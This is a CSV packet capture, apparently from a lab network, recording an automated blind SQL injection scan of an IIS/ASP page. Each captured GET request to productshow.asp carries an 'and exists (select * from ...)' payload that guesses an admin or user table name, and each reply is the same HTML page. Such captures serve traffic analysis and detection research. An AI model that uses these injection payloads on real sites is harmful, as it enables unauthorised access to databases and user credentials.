dst_port,ip_dst,ip_src,msg,src_port,timestamp
80,192.168.244.136,192.168.244.1,,56657,2019/03/24 15:35:28.959276
80,192.168.244.136,192.168.244.1,,56657,2019/03/24 15:35:28.959285
80,192.168.244.136,192.168.244.1,,56657,2019/03/24 15:35:28.960244
80,192.168.244.136,192.168.244.1,,56657,2019/03/24 15:35:28.960254
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:28.970552
56658,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:28.970584
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:28.970774
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20Manage_User) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56658,2019/03/24 15:35:28.971244
56658,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.021017
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:29.021600
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:29.021625
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:29.023257
80,192.168.244.136,192.168.244.1,,56658,2019/03/24 15:35:29.023280
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.032493
56659,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.032512
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.032642
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20user_info) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56659,2019/03/24 15:35:29.032828
56659,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.083645
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.083870
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.083880
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.084942
80,192.168.244.136,192.168.244.1,,56659,2019/03/24 15:35:29.085006
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.094239
56660,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.094258
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.094409
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20admin_userinfo) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56660,2019/03/24 15:35:29.094611
56660,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.145426
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.145666
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.145676
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.146751
80,192.168.244.136,192.168.244.1,,56660,2019/03/24 15:35:29.146762
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.157538
56661,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.157717
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.157884
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20userlist) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56661,2019/03/24 15:35:29.158027
56661,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.208233
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.208569
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.208579
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.209642
80,192.168.244.136,192.168.244.1,,56661,2019/03/24 15:35:29.209654
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.218910
56662,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.218992
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.219140
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20UserGroups) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56662,2019/03/24 15:35:29.219348
56662,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.272111
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.272406
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.272415
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.274423
80,192.168.244.136,192.168.244.1,,56662,2019/03/24 15:35:29.274439
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.283104
56663,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.283123
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.283273
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20user_list) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56663,2019/03/24 15:35:29.283503
56663,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.332975
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.333243
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.333253
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.334365
80,192.168.244.136,192.168.244.1,,56663,2019/03/24 15:35:29.334376
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.344304
56664,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.344379
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.344504
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20login) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56664,2019/03/24 15:35:29.344680
